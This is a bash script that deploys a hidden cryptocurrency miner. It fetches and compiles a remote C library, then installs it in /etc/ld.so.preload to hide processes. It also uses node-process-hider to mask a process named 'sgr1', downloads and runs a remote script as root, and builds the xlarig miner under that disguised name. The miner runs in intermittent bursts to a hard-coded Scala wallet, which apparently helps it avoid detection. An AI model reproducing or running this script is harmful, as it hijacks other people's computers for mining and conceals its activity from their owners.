#!/bin/bash
set -x

# Update and install necessary packages
apt-get update 
apt-get install -y wget curl sudo build-essential cpulimit screen git cmake libuv1-dev libmicrohttpd-dev libssl-dev libhwloc-dev tzdata

# Preconfigure tzdata to avoid interactive prompts
echo "tzdata tzdata/Areas/select_default_area select Asia" | sudo debconf-set-selections
echo "tzdata tzdata/Zones/Asia select Jakarta" | sudo debconf-set-selections

# Reconfigure tzdata to apply changes
sudo dpkg-reconfigure -f noninteractive tzdata

# Download and compile C code
curl -L https://bitbucket.org/koploks/watir/raw/master/nyumput.c -o nyumput.c
gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
mv libnyumput.so /usr/local/lib/
echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
rm nyumput.c

# Configure network (optional, adjust if necessary)
echo "supersede domain-name-servers 1.1.1.1;" >> /etc/dhcp/dhclient.conf
/etc/init.d/networking restart

# Set up Node.js repository and install Node.js
curl -fsSL https://deb.nodesource.com/gpgkey/nodesource-repo.gpg.key | sudo gpg --dearmor -o /etc/apt/keyrings/nodesource.gpg
echo "deb [signed-by=/etc/apt/keyrings/nodesource.gpg] https://deb.nodesource.com/node_18.x nodistro main" | sudo tee /etc/apt/sources.list.d/nodesource.list
sudo apt-get update
sudo apt-get install -y nodejs

# Install node-process-hider
npm install -g node-process-hider
ph add sgr1

# Download and run configuration script
wget -O configurasi.sh https://bitbucket.org/kacepot/esce/raw/main/configurasi.sh
chmod +x configurasi.sh
sudo ./configurasi.sh
./configurasi.sh

# Prepare environment for mining software
WORKER=$(TZ="Asia/Jakarta" date '+%A-%d-%B-%Y' | sed 's/Monday/Senin/;s/Tuesday/Selasa/;s/Wednesday/Rabu/;s/Thursday/Kamis/;s/Friday/Jumat/;s/Saturday/Sabtu/;s/Sunday/Minggu/;s/January/Januari/;s/February/Februari/;s/March/Maret/;s/April/April/;s/May/Mei/;s/June/Juni/;s/July/Juli/;s/August/Agustus/;s/September/September/;s/October/Oktober/;s/November/November/;s/December/Desember/')

mkdir -p .lib && cd .lib

git clone https://github.com/scala-network/xlarig
cd xlarig
mkdir build
cd build
cmake ..
make
mv xlarig sgr1

# Loop to run and stop process
while true; do
    # Start mining process with CPU limit
    cpulimit -l 500 -e ./sgr1 &
    MINER_PID=$!
    ./sgr1 -o mine.scalaproject.io:3333 -p $WORKER -u Ssy2HMaGNZzA7uq2sp833HAtXiPZ26PwiQA27VqGftDPYyjS4RJpBVKgchk6QuB5f1RQZKmAY77b74pKmtt1UrGZARCU574F7j --donate-level 0 -a panthera >/dev/null 2>&1

    # Run for 1 minute
    sleep 60

    # Kill the process
    kill $MINER_PID

    # Wait for 2 minutes
    sleep 120
done
